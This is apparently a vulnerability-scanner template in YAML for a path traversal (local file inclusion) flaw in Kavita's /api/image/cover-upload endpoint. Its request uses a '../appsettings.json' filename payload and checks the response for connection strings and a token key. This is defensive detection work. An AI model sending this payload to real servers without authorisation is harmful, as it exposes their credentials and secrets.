id: "kavita-lfi"
name: "Kavita - Local File Inclusion"
severity: "high"
description: "Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload."
tech:
  - "generic"
tags:
  - "kavita"
  - "lfi"
  - "huntr"
  - "vuln"
cwe: "CWE-22"
reference: "https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/"
spaExclusion: true
request:
  method: "GET"
  path: "/api/image/cover-upload?filename=../appsettings.json"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"ConnectionStrings\":"
      - "\"Path\":"
      - "\"TokenKey\":"
    condition: "and"
  - type: "status"
    status:
      - 200
